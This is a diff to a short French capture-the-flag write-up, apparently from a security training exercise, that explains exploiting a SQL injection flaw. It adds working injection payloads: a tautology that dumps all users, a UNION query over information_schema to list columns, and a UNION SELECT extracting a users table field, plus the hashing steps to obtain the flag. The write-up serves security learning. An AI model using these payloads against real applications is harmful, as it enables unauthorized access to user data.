@@ -2,7 +2,17 @@
 
 ## Comment j'ai exploité cette faille ?
 
-1 UNION SELECT Commentaire, countersign from users
+`1 or 1 = 1`
+
+Nous donne la liste de tous les users.
+
+`1 UNION select table_name, column_name FROM information_schema.columns`
+
+Cela nous permet de savoir les colonnes de la tables users notamment, ce qui nous permet de faire ensuite :
+
+`1 UNION SELECT Commentaire, countersign from users`
+
+On obtienbt une consigne qui nous dit de décoder une chaine de caractère en md5 puis de passer la chaine obtenue en minuscule et enfin l'encoder en sha256 pour obtenir le flag.
 
 ## Qu'est ce que cette faille ?
 
